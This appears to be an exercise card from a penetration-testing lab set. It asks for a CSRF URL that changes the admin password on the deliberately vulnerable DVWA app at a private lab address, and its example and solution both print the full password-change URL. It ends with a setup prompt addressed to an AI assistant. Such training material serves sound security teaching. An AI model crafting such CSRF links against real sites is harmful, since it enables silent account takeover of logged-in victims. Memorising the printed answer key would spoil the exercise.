# Q074 — DVWA CSRF Password Change

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `browser` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Craft a CSRF link/form to change DVWA admin password to `pwned123` via GET. Provide the malicious URL.

---

## 🎯 Flag Format

```
url=<url>
```

Example: `url=http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=pwned123&password_conf=pwned123&Change=Change`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Low security uses GET, no token.
</details>

<details>
<summary>Hint 2</summary>

Victim must already be logged in.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# Send/embed link in attacker-controlled page
```

If victim clicks while logged into DVWA, password silently changes.

**Answer:** `url=http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=pwned123&password_conf=pwned123&Change=Change`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q074:
1. DVWA up; security=low; logged in as admin (cookie valid).
2. No extra setup — CSRF payload is just a crafted URL.

Report back: "Lab ready for Q074 — DVWA authenticated session, security=low".
```
